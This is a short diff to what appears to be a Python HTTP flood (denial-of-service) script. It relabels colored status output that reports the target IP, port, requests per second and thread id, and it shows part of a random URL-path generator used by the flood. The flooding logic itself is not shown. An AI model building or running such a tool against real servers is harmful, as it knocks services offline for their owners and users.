@@ -24,9 +24,9 @@ def clear_text():
         os.system('clear')
 
 def status_print(ip,port,thread_id,rps,path_get):
-    print(f"\r{Fore.YELLOW}HTTP {Fore.LIGHTWHITE_EX}Flood {Fore.WHITE}=> {Fore.BLUE}TARGET{Fore.WHITE}={ip}:{port} {Fore.LIGHTBLUE_EX}PATH{Fore.WHITE}={path_get}{Fore.RESET}") 
-    print(f"\r{Fore.BLUE}HTTP {Fore.LIGHTGREEN_EX}Flood {Fore.WHITE}=> {Fore.YELLOW}TARGET{Fore.WHITE}={ip}:{port} {Fore.CYAN}RPS{Fore.WHITE}={rps}{Fore.RESET}") 
-    print(f"\r{Fore.WHITE}HTTP {Fore.LIGHTYELLOW_EX}Flood {Fore.WHITE}=> {Fore.CYAN}TARGET{Fore.WHITE}={ip}:{port}{Fore.LIGHTCYAN_EX}ID{Fore.WHITE}={thread_id}{Fore.RESET}")
+    print(f"\r{Fore.YELLOW}FLOODING {Fore.LIGHTWHITE_EX}HTTP {Fore.WHITE}=> {Fore.BLUE}TARGET{Fore.WHITE}={ip}:{port} {Fore.LIGHTBLUE_EX}PATH{Fore.WHITE}={path_get} {Fore.RESET}") 
+    print(f"\r{Fore.BLUE}FLOODING {Fore.LIGHTGREEN_EX}HTTP {Fore.WHITE}=> {Fore.YELLOW}TARGET{Fore.WHITE}={ip}:{port} {Fore.CYAN}RPS{Fore.WHITE}={rps} {Fore.RESET}") 
+    print(f"\r{Fore.WHITE}FLOODING {Fore.LIGHTYELLOW_EX}HTTP {Fore.WHITE}=> {Fore.CYAN}TARGET{Fore.WHITE}={ip}:{port} {Fore.LIGHTCYAN_EX}ID{Fore.WHITE}={thread_id} {Fore.RESET}")
 def generate_url_path_pyflooder(num):
     msg = str(string.ascii_letters + string.digits + string.punctuation)
     data = "".join(random.sample(msg, int(num)))
